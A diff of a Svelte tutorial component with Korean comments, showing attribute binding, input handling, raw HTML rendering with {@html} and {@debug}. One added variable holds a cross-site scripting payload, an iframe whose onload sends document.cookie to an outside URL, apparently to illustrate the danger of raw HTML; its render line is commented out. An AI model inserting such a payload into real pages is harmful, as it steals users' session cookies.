@@ -1,14 +1,28 @@
 <script>
-  import { tick } from 'svelte';
+  let href = 'https://github.com/Jinwook-Song/svelte-basic';
+  let name = 'jinwook';
+  let value = 'new input value';
+  let isUppercase = false;
 
-  let name = 'world';
+  let h1 = '<h1>원시 HTML</h1>';
+  let xss =
+    '<iframe onload="document.location=`https://github.com/Jinwook-Song/svelte-basic?${document.cookie}`"></iframe>';
 
-  async function handler() {
-    name = 'jw';
-    await tick(); // 화면이 갱신될때까지 기다려주는 함수. Promise를 반환
-    const h1 = document.querySelector('h1');
-    console.log(h1.innerText);
-  }
+  let index = 0;
 </script>
 
-<h1 on:click={handler}>hello {name}!</h1>
+<a {href}>{name}</a>
+
+<!-- 보간법 -->
+<input {value} on:input={(e) => (value = e.target.value)} />
+<input bind:value />
+
+<div>{isUppercase ? 'DIV' : 'div'}</div>
+
+<!-- 원시 HTML -->
+{@html h1}
+<!-- {@html xss} -->
+
+<!-- 데이터 디버깅 -->
+{@debug index}
+<h1 on:click={() => (index += 1)}>Hello {name}</h1>
